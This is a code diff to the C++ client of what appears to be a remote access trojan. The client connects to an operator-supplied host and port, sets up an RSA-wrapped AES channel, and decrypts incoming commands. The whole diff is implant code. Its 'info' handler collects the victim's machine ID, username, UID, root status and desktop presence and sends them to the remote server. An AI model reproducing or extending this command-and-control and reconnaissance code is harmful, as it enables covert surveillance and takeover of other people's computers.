@@ -1,3 +1,8 @@
+/*
+Author: ISSAC
+
+*/
+
 #include <iostream>
 #include <unistd.h>
 #include <cstring>
@@ -6,6 +11,7 @@
 #include <stdlib.h>
 #include <sstream>
 #include <vector>
+#include <tuple>
 
 #include <arpa/inet.h>
 
@@ -23,81 +29,148 @@ const int g_nREAD_LENGTH = 65535;
 
 std::ostringstream g_oss;
 
+void fnRecvCommand(clsVictim& victim, const std::vector<std::string>& vsMsg)
+{
+    if (vsMsg.size() == 0)
+        return;
+
+    if (vsMsg[0] == "info")
+    {
+        clsInfoSpyder spy;
+        auto stInfo = spy.m_info;
+
+        std::vector<std::string> vsInfo = {
+            "info",
+            stInfo.m_bHasDesktop ? "1" : "0",
+            stInfo.m_szMachineID,
+            stInfo.m_szUsername,
+            std::to_string(stInfo.m_nUid),
+            stInfo.m_bIsRoot ? "1" : "0"
+        };
+
+        victim.fnSendCommand(vsInfo);
+    }
+}
+
 void fnHandler(int sktSrv)
 {
-    clsTools g_eztools;
-    g_eztools.fnLogInfo("Starting session...");
+    clsTools::fnLogInfo("Starting session...");
 
     int nRecv = 0;
-    std::vector<unsigned char> vuStatisRecvBuf(g_nREAD_LENGTH);
+    std::vector<unsigned char> vuStaticRecvBuf(g_nREAD_LENGTH);
     std::vector<unsigned char> vuDynamicRecvBuf;
 
     clsVictim victim(sktSrv);
 
+    // initial handshake
     victim.fnSendCmdParam(0, 0);
 
     do
     {
-        std::fill(vuStatisRecvBuf.begin(), vuStatisRecvBuf.end(), 0);
-        nRecv = recv(sktSrv, vuStatisRecvBuf.data(), vuStatisRecvBuf.size(), 0);
+        // Receive data
+        std::fill(vuStaticRecvBuf.begin(), vuStaticRecvBuf.end(), 0);
+        nRecv = recv(sktSrv, vuStaticRecvBuf.data(), vuStaticRecvBuf.size(), 0);
 
         if (nRecv <= 0)
-            break;
+            break; // socket closed or error
 
-        vuStatisRecvBuf.resize(nRecv);
+        // Append to dynamic buffer
         vuDynamicRecvBuf.insert(
             vuDynamicRecvBuf.end(),
-            vuStatisRecvBuf.begin(),
-            vuStatisRecvBuf.end()
-        );
+            vuStaticRecvBuf.begin(),
+            vuStaticRecvBuf.begin() + nRecv);
 
-        while (vuDynamicRecvBuf.size() >= clsEDP::HEADER_SIZE)
+        // --- Process complete packets ---
+        while (true)
         {
+            // not enough for header yet
+            if (vuDynamicRecvBuf.size() < clsEDP::HEADER_SIZE)
+                break;
+
             auto [nCommand, nParam, nLength] = clsEDP::fnGetHeader(vuDynamicRecvBuf);
 
+            // incomplete packet — wait for next recv
             if (vuDynamicRecvBuf.size() < clsEDP::HEADER_SIZE + static_cast<size_t>(nLength))
                 break;
 
+            // construct EDP from full message
             clsEDP edp(vuDynamicRecvBuf);
-            vuDynamicRecvBuf = edp.m_abMoreData();
+            vuDynamicRecvBuf = edp.fnGetMoreData();  // consume one packet
 
-            std::vector<unsigned char> vuMsg = std::get<3>(edp.fnGetMsg());
+            auto [cmd, param, len, vuMsg] = edp.fnGetMsg();
 
-            if (nCommand == 0)
+            // === handle packet ===
+            if (cmd == 0)
             {
-                if (nParam == 0)
+                if (param == 0)
                 {
-
+                    // reserved handshake / ping
                 }
             }
-            else if (nCommand == 1)
+            else if (cmd == 1)
             {
-                if (nParam == 0)
+                if (param == 0)
                 {
-                    printf("%d\n", nRecv);
-                    std::string binStr(reinterpret_cast<const char*>(vuMsg.data()), vuMsg.size());
-                    g_eztools.fnLogOK(binStr);
+                    // --- handshake stage 2: receive RSA key ---
+                    std::string szb64RSAKey(reinterpret_cast<const char*>(vuMsg.data()), vuMsg.size());
+                    std::vector<unsigned char> vuRSAKey = clsEZData::fnb64Decode(szb64RSAKey);
+
+                    // create crypto with RSA key
+                    clsCrypto crypto(vuRSAKey);
+                    victim.m_crypto = crypto;
+
+                    // generate AES key+IV, encrypt, and send
+                    auto [vuAESKey, vuAESIV] = victim.m_crypto.fnCreateAESKey();
+                    std::vector<unsigned char> ucKey(vuAESKey.begin(), vuAESKey.end());
+                    std::vector<unsigned char> ucIV(vuAESIV.begin(), vuAESIV.end());
+
+                    std::ostringstream oss;
+                    oss << clsEZData::fnb64Encode(ucKey) << "|" << clsEZData::fnb64Encode(ucIV);
+
+                    std::string szMsg = oss.str();
+                    std::string szCipherMsg = clsEZData::fnb64EncodeUtf8(victim.m_crypto.fnvuRSAEncrypt(szMsg));
+
+                    victim.fnSend(1, 1, szCipherMsg);
+                }
+                else if (param == 2)
+                {
+                    std::string szChallenge(reinterpret_cast<const char*>(vuMsg.data()), vuMsg.size());
+                    std::string szCipher = clsEZData::fnb64EncodeUtf8(victim.m_crypto.fnvuAESEncrypt(szChallenge));
+
+                    victim.fnSend(1, 3, szCipher);
+                }
+            }
+            else if (cmd == 2)
+            {
+                if (param == 0)
+                {
+                    std::vector<unsigned char> vuPlain = victim.m_crypto.fnvuAESDecrypt(vuMsg);
+                    std::string szMsg(vuPlain.begin(), vuPlain.end());
+
+                    auto decoded = clsEZData::fnvsB64ToVectorStringParser(szMsg);
+                    
+                    fnRecvCommand(victim, decoded);
                 }
             }
         }
 
     } while (nRecv > 0);
 
-    g_eztools.fnLogInfo("Session is terminated.");
+    clsTools::fnLogInfo("Session is terminated.");
 }
 
 int main(int argc, char *argv[])
 {
     if (argc == 3)
     {
-        clsTools g_eztools;
-
         g_szIP = argv[1];
         g_nPort = atoi(argv[2]);
 
-        g_oss << "Input host: " << g_szIP << ":" << g_nPort;
-        g_eztools.fnLogInfo(g_oss.str());
-        g_oss.clear();
+        std::ostringstream oss;
+
+        oss << "Input host: " << g_szIP << ":" << g_nPort;
+        clsTools::fnLogInfo(oss.str());
+        oss.clear();
     }
 
     int sktSrv = socket(AF_INET, SOCK_STREAM, 0);
@@ -115,6 +188,4 @@ int main(int argc, char *argv[])
     {
         fnHandler(sktSrv);
     }
-
-    uint32_t uiKeyLength;
 }
